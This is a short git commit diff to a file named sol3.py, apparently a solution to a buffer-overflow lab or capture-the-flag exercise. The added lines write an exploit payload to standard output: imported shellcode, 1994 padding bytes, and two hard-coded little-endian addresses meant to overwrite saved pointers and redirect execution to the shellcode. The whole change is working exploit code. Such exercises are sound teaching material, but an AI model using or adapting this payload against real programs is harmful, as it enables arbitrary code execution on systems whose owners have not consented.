c4429d0840e614d97e6f942e3c83f015b47eafee
Angela Matta <tieflingcoderfreelance@gmail.com>
2024-11-14 00:08:04 -0500

    Update sol3.py

--- sol3.py
+++ sol3.py
@@ -3,3 +3,6 @@
 import sys
 
 from shellcode import shellcode
+p = 0x7ffffff6b0d8
+a = 0x7ffffff6a8c0
+sys.stdout.buffer.write(shellcode + b'\x00' * 1994 + a.to_bytes(8,'little' )+ p.to_bytes(8,'little'))
